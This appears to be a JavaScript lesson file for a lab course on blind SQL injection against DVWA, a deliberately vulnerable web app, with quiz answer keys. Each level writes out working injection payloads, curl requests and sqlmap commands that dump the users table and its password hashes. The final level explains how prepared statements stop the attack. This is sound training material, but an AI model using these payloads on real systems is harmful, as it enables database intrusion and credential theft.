const LESSONS = [
  {
    title: "Level 1: Low Security",
    points: 60,
    content: `🚀 ONE-TIME SETUP — Run this FIRST before any level
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Start your DVWA and Kali containers from the buttons above.
Inside the Kali terminal (docker exec -it <id> bash), run:

# Set your DVWA port (check the URL of your DVWA tab)
PORT=8206   ← replace with your actual port

# Step 1: Get CSRF token and login (saves session to /tmp/dvwa.txt)
TOKEN=$(curl -s -c /tmp/dvwa.txt "http://172.17.0.1:$PORT/login.php" | grep -oP "user_token' value='\\K[^']+")
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/login.php" \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" -L > /dev/null

# Step 2: Save the session ID to a variable
SID=$(grep PHPSESSID /tmp/dvwa.txt | awk '{print $NF}')
echo "Session ready: $SID"

If you see a session ID printed, you are logged in. ✅
Re-run this setup if your session ever expires.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 LEVEL 1 — LOW SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Set the security level to Low:
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=low&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD
━━━━━━━━━━━━━━━━━━━━━
1. In DVWA, click 'SQL Injection (Blind)'.
2. Type in the input box and click Submit. Watch for "User ID exists in the database."

  TRUE test:   1' AND 1=1#   → shows "User ID exists"
  FALSE test:  1' AND 1=2#   → shows NOTHING

3. Time-based test (page pauses ~5 seconds = vulnerable):
  Type:  1' AND SLEEP(5)#

4. Find number of users:
  1' AND (SELECT COUNT(*) FROM users)=5#   → TRUE if 5 users exist

5. Extract admin's password hash char by char:
  1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5'#

🖥️  MANUAL CURL METHOD
━━━━━━━━━━━━━━━━━━━━━
# Verify page works
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  | grep -o "User ID exists"

# Time-based (should take ~5 seconds)
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1'+AND+SLEEP(5)%23&Submit=Submit"

# Boolean TRUE (prints "User ID exists")
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1'+AND+1%3D1%23&Submit=Submit" \
  | grep -o "User ID exists"

# Boolean FALSE (prints nothing)
curl -s -H "Cookie: security=low; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1'+AND+1%3D2%23&Submit=Submit" \
  | grep -o "User ID exists"

🤖 SQLMAP METHOD
━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=$SID" \
  --technique=BT -D dvwa -T users --dump --batch`,
    questions: [
      { q: "In Blind SQLi, does the page display query results directly? (yes/no)", a: "no" },
      { q: "What SQL function causes a time delay to confirm injection?", a: "SLEEP" },
      { q: "What is the first DVWA username? (verify with boolean injection)", a: "admin" },
      { q: "What is admin's password hash? (run sqlmap to find it)", a: "5f4dcc3b5aa765d61d8327deb882cf99" },
      { q: "What does that MD5 hash decode to?", a: "password" }
    ]
  },
  {
    title: "Level 2: Medium Security",
    points: 60,
    content: `📋 LEVEL 2 — MEDIUM SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run the ONE-TIME SETUP from Level 1 first if you haven't already.
(PORT and SID variables must be set in your terminal)

What changed: Input is now a DROPDOWN. The id is sent as POST (not GET).
Single quotes are escaped — but the field is an INTEGER so quotes are not needed!

# Set security level to Medium
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=medium&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD (Burp Suite)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Open Burp Suite → enable intercept.
2. Select a user from the dropdown and click Submit.
3. Burp captures: id=1&Submit=Submit
4. Change id value (NO quotes needed on integers):
   Boolean TRUE:  id=1 AND 1=1
   Boolean FALSE: id=1 AND 1=2
   Time-based:    id=1 AND SLEEP(5)

🖥️  MANUAL CURL METHOD
━━━━━━━━━━━━━━━━━━━━━
# Verify page is reachable
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -d "id=1&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" | grep -o "User ID exists"

# Time-based (no quotes on integer field!)
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -d "id=1 AND SLEEP(5)&Submit=Submit" \
  -o /dev/null -w "Time: %{time_total}s\n" \
  -H "Cookie: security=medium; PHPSESSID=$SID"

# Boolean TRUE
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -d "id=1 AND 1=1&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" | grep -o "User ID exists"

# Boolean FALSE (should print nothing)
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -d "id=1 AND 1=2&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" | grep -o "User ID exists"

# Confirm admin exists using hex encoding (avoids needing quotes)
curl -s -X POST "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -d "id=1 AND (SELECT COUNT(*) FROM users WHERE user=0x61646d696e)=1&Submit=Submit" \
  -H "Cookie: security=medium; PHPSESSID=$SID" | grep -o "User ID exists"

🤖 SQLMAP METHOD
━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  --data="id=1&Submit=Submit" \
  --cookie="security=medium; PHPSESSID=$SID" \
  --technique=BT -D dvwa -T users --dump --batch`,
    questions: [
      { q: "In Medium security, is the id parameter sent via GET or POST?", a: "POST" },
      { q: "Do you need single quotes when injecting into an integer parameter? (yes/no)", a: "no" },
      { q: "What is the hex encoding of the string 'admin'?", a: "0x61646d696e" },
      { q: "What sqlmap flag specifies POST body data?", a: "--data" },
      { q: "How many users are in the DVWA users table? (use injection to find)", a: "5" }
    ]
  },
  {
    title: "Level 3: High Security",
    points: 60,
    content: `📋 LEVEL 3 — HIGH SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run the ONE-TIME SETUP from Level 1 first if you haven't already.
(PORT and SID variables must be set in your terminal)

What changed: The id parameter is now sent via a SESSION COOKIE (not GET/POST).
A pop-up page collects input, which gets stored server-side as a cookie value.

# Set security level to High
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=high&seclev_submit=Submit" > /dev/null

🔬 MANUAL BROWSER METHOD
━━━━━━━━━━━━━━━━━━━━━━━
1. Click 'SQL Injection (Blind)' → click the link to open the pop-up.
2. In the pop-up input box, type your payload and click Submit.
3. Close the pop-up and check the MAIN page for the result.

  TRUE:   1' AND 1=1#      → main page shows "User ID exists"
  FALSE:  1' AND 1=2#      → main page shows NOTHING
  Time:   1' AND SLEEP(5)# → main page takes 5+ seconds to load

4. Confirm admin user:
  1' AND (SELECT user FROM users WHERE user='admin')='admin'#

🖥️  MANUAL CURL METHOD (inject via 'id' cookie!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Time-based — should pause ~5 seconds
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -H "Cookie: id=1' AND SLEEP(5)#; security=high; PHPSESSID=$SID"

# Boolean TRUE
curl -s "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -H "Cookie: id=1' AND 1=1#; security=high; PHPSESSID=$SID" \
  | grep -o "User ID exists"

# Boolean FALSE (prints nothing)
curl -s "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -H "Cookie: id=1' AND 1=2#; security=high; PHPSESSID=$SID" \
  | grep -o "User ID exists"

# Confirm admin exists
curl -s "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  -H "Cookie: id=1' AND (SELECT user FROM users WHERE user='admin')='admin'#; security=high; PHPSESSID=$SID" \
  | grep -o "User ID exists"

🤖 SQLMAP METHOD (--level=2 required for cookie testing!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/" \
  --cookie="id=1; security=high; PHPSESSID=$SID" \
  --level=2 --technique=BT \
  -D dvwa -T users --dump --batch`,
    questions: [
      { q: "In High security, through which HTTP mechanism is 'id' passed?", a: "cookie" },
      { q: "What minimum sqlmap --level value is needed to test cookie parameters?", a: "2" },
      { q: "What is the name of the DVWA database? (hint: inject SELECT database())", a: "dvwa" },
      { q: "Use cookie injection to find the 5th username (LIMIT 4,1). What is it?", a: "smithy" },
      { q: "What is smithy's password hash?", a: "5f4dcc3b5aa765d61d8327deb882cf99" }
    ]
  },
  {
    title: "Level 4: Impossible Security",
    points: 60,
    content: `📋 LEVEL 4 — IMPOSSIBLE SECURITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Run the ONE-TIME SETUP from Level 1 first if you haven't already.
(PORT and SID variables must be set in your terminal)

# Set security level to Impossible
curl -s -b /tmp/dvwa.txt -c /tmp/dvwa.txt -X POST "http://172.17.0.1:$PORT/security.php" \
  -d "security=impossible&seclev_submit=Submit" > /dev/null

🧠 WHY IT CANNOT BE EXPLOITED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Vulnerable code (Low/Medium/High):
  $query = "SELECT ... WHERE id='$id' LIMIT 1";
  → User input is mixed into SQL → SLEEP() and conditions execute as SQL!

Impossible level (PDO Prepared Statement):
  $stmt = $pdo->prepare("SELECT ... WHERE id = :id LIMIT 1");
  $stmt->bindParam(':id', $id, PDO::PARAM_INT);

The SQL structure is compiled FIRST. User input arrives only as a pure data value.
SLEEP(5) is never executed. TRUE/FALSE payloads produce identical responses.

🖥️  PROVE IT — Try and fail with curl
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Time-based: SLEEP is NEVER executed — time should be ~0 seconds
curl -s -o /dev/null -w "Time: %{time_total}s\n" \
  -H "Cookie: security=impossible; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1'+AND+SLEEP(5)%23&Submit=Submit"

# Boolean TRUE — note the response
curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1'+AND+1%3D1%23&Submit=Submit" \
  | grep -o "User ID exists"

# Boolean FALSE — SAME response as TRUE = no information leaks!
curl -s -H "Cookie: security=impossible; PHPSESSID=$SID" \
  "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1'+AND+1%3D2%23&Submit=Submit" \
  | grep -o "User ID exists"

🤖 SQLMAP — Confirms it finds nothing
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
sqlmap -u "http://172.17.0.1:$PORT/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
  --cookie="security=impossible; PHPSESSID=$SID" \
  --technique=BT --batch

Expected result:
  [WARNING] all tested parameters do not appear to be injectable`,
    questions: [
      { q: "What PHP database extension does the Impossible level use? (3 letters)", a: "PDO" },
      { q: "Does SLEEP(5) cause a delay on the Impossible level? (yes/no)", a: "no" },
      { q: "Do TRUE and FALSE boolean payloads return different responses on Impossible? (yes/no)", a: "no" },
      { q: "In a prepared statement, is user input compiled as part of the SQL structure? (yes/no)", a: "no" },
      { q: "What does sqlmap say when it finds no injection point? (last word of the warning)", a: "injectable" }
    ]
  }
];
